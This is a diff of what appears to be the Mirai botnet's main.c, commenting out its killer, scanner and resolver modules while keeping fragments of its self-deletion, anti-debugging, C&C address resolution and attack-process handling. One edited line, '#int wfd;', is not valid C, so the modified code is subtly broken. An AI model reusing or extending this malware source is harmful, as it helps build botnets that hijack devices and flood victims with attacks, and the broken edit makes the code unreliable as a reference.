@@ -19,10 +19,10 @@
 #include "table.h"
 #include "rand.h"
 #include "attack.h"
-#include "killer.h"
-#include "scanner.h"
+//#include "killer.h"
+//#include "scanner.h"
 #include "util.h"
-#include "resolv.h"
+//#include "resolv.h"
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -55,7 +55,7 @@ int main(int argc, char **args)
 
 #ifndef DEBUG
     sigset_t sigs;
-    int wfd;
+    #int wfd;
 
     // Delete self
     unlink(args[0]);
@@ -218,9 +218,9 @@ int main(int argc, char **args)
             printf("[main] Detected newer instance running! Killing self\n");
 #endif
 #ifdef MIRAI_TELNET
-            scanner_kill();
+            //scanner_kill();
 #endif
-            killer_kill();
+            //killer_kill();
             attack_kill_all();
             kill(pgid * -1, 9);
             exit(0);
@@ -454,7 +454,7 @@ static void ensure_single_instance(void)
         
         sleep(5);
         close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        //killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
         ensure_single_instance(); // Call again, so that we are now the control
     }
     else
@@ -465,7 +465,7 @@ static void ensure_single_instance(void)
             printf("[main] Failed to call listen() on fd_ctrl\n");
             close(fd_ctrl);
             sleep(5);
-            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+            //killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
             ensure_single_instance();
 #endif
         }
@@ -489,7 +489,7 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         (void (*) (void))table_lock_val,
         (void (*) (void))util_memcpy,
         (void (*) (void))util_strcmp,
-        (void (*) (void))killer_init,
+        //(void (*) (void))killer_init,
         (void (*) (void))anti_gdb_entry
     };
     BOOL matches;
